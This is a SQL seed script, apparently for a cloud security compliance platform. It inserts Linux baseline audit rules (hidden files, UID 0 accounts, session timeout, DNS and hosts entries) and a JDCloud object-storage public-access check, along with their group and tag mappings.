INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('c0f065e4-f205-4b1d-9d1d-a037f9e31e9d', 'Linux 系统中隐藏异常文件检测', 1, 'HighRisk', '检测 Linux 系统中是否存在隐藏异常文件', 'hideFile=$(find / -xdev -mount \\( -name \"..*\" -o -name \"...*\" \\) 2> /dev/null)\nif [  -z \"${hideFile}\" ];then\n  echo \"HummerSuccess:不存在隐藏文件，符合要求\"\nelse\n  echo \"HummerError:${hideFile}是隐藏文件，建议审视\" \nfi', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('29bac3a8-6cde-49a8-968e-45745d917a08', 'Linux 系统中非 root 账户 uid 检测', 1, 'LowRisk', '查看 Linux 系统中非 root 账户 uid 为 0 的账户', 'UIDS=`awk -F[:] \'NR!=1{print $3}\' /etc/passwd`\nflag=0\nfor i in $UIDS\n\ndo\nif [ $i = 0 ];then\n\n  echo \"HummerError:存在非root账号的账号UID为0，不符合要求\"\n\nelse\n flag=1\nfi\ndone\nif [ $flag = 1 ];then\n\n  echo \"HummerSuccess:不存在非root账号的账号UID为0，符合要求\"\n\nfi', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('a9c11f7e-ba44-416e-bbfa-cd4d96f8165f', 'Linux 账户配置自动注销时间检测', 1, 'LowRisk', '检测 Linux 账户是否配置自动注销时间', 'checkTimeout=$(cat /etc/profile | grep TMOUT | awk -F[=] \'{print $2}\')\nif [ $? -eq 0 ];then\n  TMOUT=`cat /etc/profile | grep TMOUT | awk -F[=] \'{print $2}\'`\n\n  if [[ $checkTimeout -le 600 ]] && [[  $checkTimeout -ge 10 ]];then\n    echo \"HummerSuccess: 账号超时时间${TMOUT}秒,符合要求\"\n  else\n    echo \"HummerError:账号超时时间${TMOUT}秒,不符合要求,建议设置小于 600 秒\"\n  fi\nelse\n  echo \"HummerError:账号超时不存在自动注销,不符合要求,建议设置小于 600 秒\"\nfi', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('e0ba707c-4a08-490e-93fb-1e98b1db0b3b', 'Linux resolve 中 DNS 服务器检测', 1, 'MediumRisk', '检测 Linux resolve 中 DNS 服务器是否正确', 'function check_ip() {\n  IP=$1\n  VALID_CHECK=$(echo \"$IP\"|awk -F. \'$1<=255&&$2<=255&&$3<=255&&$4<=255{print \"yes\"}\')\n  if echo \"$IP\"|grep -E \"^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$\" > /dev/null;then\n    if [ ${VALID_CHECK:-no} == \"yes\" ]; then\n      echo \"HummerSuccess: DNS 服务器 $IP 有效\"\n    else\n      echo \"HummerError: DNS 服务器 $IP 是个无效IP\"\n    fi\n  else\n    echo \"HummerError: 无效IP $IP  !\"\n  fi\n}\n\nfor ip in `cat /etc/resolv.conf 2>/dev/null| grep -E -o \"([0-9]{1,3}[\\.]){3}[0-9]{1,3}\"`\ndo\ncheck_ip $ip\ndone', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');
INSERT INTO `server_rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `last_modified`, `flag`, `type`) VALUES ('c43ab09e-0c6c-4b2e-866d-3426477a6f3c', 'Linux hosts 记录中服务器地址检测', 1, 'LowRisk', '检测 Linux hosts 记录中服务器地址是否正确', 'function check_ip() {\n  IP=$1\n  VALID_CHECK=$(echo \"$IP\"|awk -F. \'$1<=255&&$2<=255&&$3<=255&&$4<=255{print \"yes\"}\')\n  if echo \"$IP\"|grep -E \"^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$\" > /dev/null;then\n    if [ ${VALID_CHECK:-no} == \"yes\" ]; then\n      echo \"HummerSuccess: hosts 服务器 $IP 有效\"\n    else\n      echo \"HummerError: hosts 服务器 $IP 是个无效IP\"\n    fi\n  else\n    echo \"HummerError: 无效IP $IP  !\"\n  fi\n}\n\nfor ip in `cat /etc/hosts|awk \'{print $1}\'|grep -E \"^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$\"`\ndo\ncheck_ip $ip\ndone', '[]', concat(unix_timestamp(now()), '001'), 1, 'linux');

INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('c43ab09e-0c6c-4b2e-866d-3426477a6f3c', 'server');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('e0ba707c-4a08-490e-93fb-1e98b1db0b3b', 'server');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('a9c11f7e-ba44-416e-bbfa-cd4d96f8165f', 'server');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('29bac3a8-6cde-49a8-968e-45745d917a08', 'server');
INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('c0f065e4-f205-4b1d-9d1d-a037f9e31e9d', 'server');

-- -----------------
-- JDCloud rule
-- -----------------
INSERT INTO `rule_group` (`name`, `description`, `level`, `plugin_id`, `flag`) VALUES ('JDCloud OSS 合规基线', 'OSS 合规检查为您提供全方位的对象存储资源检查功能。', '对象存储', 'hummer-jdcloud-plugin', 1);
SELECT @groupIdJdOss := LAST_INSERT_ID();

INSERT INTO `rule_group` (`name`, `description`, `level`, `plugin_id`, `flag`) VALUES ('QingCloud OSS 合规基线', 'OSS 合规检查为您提供全方位的对象存储资源检查功能。', '对象存储', 'hummer-qingcloud-plugin', 1);
SELECT @groupIdQingOss := LAST_INSERT_ID();

INSERT INTO `rule_group` (`name`, `description`, `level`, `plugin_id`, `flag`) VALUES ('qiniu OSS 合规基线', 'OSS 合规检查为您提供全方位的对象存储资源检查功能。', '对象存储', 'hummer-qiniu-plugin', 1);
SELECT @groupIdQiniuOss := LAST_INSERT_ID();

SELECT id INTO @groupIdJd FROM rule_group WHERE name = 'JDCloud 等保预检';

INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('be1eddc5-9905-4280-8ae1-b841c68ce483', @groupIdQingOss);
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('1268870b-188d-41a8-a86e-0c83299dc93c', @groupIdQiniuOss);

INSERT INTO `rule` (`id`, `name`, `status`, `severity`, `description`, `script`, `parameter`, `plugin_id`, `plugin_name`, `plugin_icon`, `last_modified`, `flag`, `scan_type`, `suggestion`) VALUES ('290cb102-7ce8-471e-8540-8c4e55da259b', 'JDCloud OSS 公开读取访问权限检测', 1, 'HighRisk', 'JDCloud 查看您的 存储桶是否不允许公开访问权限。如果某个存储桶策略允许公开访问权限，则该存储桶“不合规“', 'policies:\n    - name: jdcloud-oss-private\n      resource: jdcloud.oss\n      filters:\n        - type: private', '[]', 'hummer-jdcloud-plugin', '京东云', 'jdcloud.png', concat(unix_timestamp(now()), '002'), 1, 'custodian', NULL);

INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('290cb102-7ce8-471e-8540-8c4e55da259b', @groupIdJd);
INSERT INTO `rule_group_mapping` (`rule_id`, `group_id`) VALUES ('290cb102-7ce8-471e-8540-8c4e55da259b', @groupIdJdOss);

INSERT INTO `rule_tag_mapping` (`rule_id`, `tag_key`) VALUES ('290cb102-7ce8-471e-8540-8c4e55da259b', 'safety');

INSERT INTO `rule_type` (`id`, `rule_id`, `resource_type`) VALUES ('b553c99b-eac5-413f-8e1c-f058590c58cc', '290cb102-7ce8-471e-8540-8c4e55da259b', 'jdcloud.oss');

INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('290cb102-7ce8-471e-8540-8c4e55da259b', '10');
INSERT INTO `rule_inspection_report_mapping` (`rule_id`, `report_id`) VALUES ('290cb102-7ce8-471e-8540-8c4e55da259b', '13');
